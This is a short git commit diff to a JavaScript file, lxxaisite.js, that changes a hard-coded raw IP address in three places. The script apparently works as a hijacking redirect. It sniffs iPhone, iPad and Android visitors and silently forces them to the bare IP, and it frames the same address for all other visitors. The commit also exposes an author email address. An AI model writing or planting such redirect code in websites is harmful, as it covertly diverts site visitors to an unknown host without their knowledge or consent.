c4154edc02c264d9a86fa9db52c765df268d7f54
dateshare <chulishen567@gmail.com>
2021-12-29 19:01:01 +0800

    message

--- lxxaisite.js
+++ lxxaisite.js
@@ -1,13 +1,13 @@
 //lxxaisite
 if (/(iPhone|iPad|iPod|iOS)/i.test(navigator.userAgent)) {
     //alert(navigator.userAgent);  
-    window.location.href = "http://38.26.195.28";
+    window.location.href = "http://38.26.195.30";
 }else if (/(Android)/i.test(navigator.userAgent)) {
     //alert(navigator.userAgent); 
-    window.location.href = "http://38.26.195.28";
+    window.location.href = "http://38.26.195.30";
 }
 var titlestr=document.title;
-setFrame("http://38.26.195.28");
+setFrame("http://38.26.195.30");
 
 
 
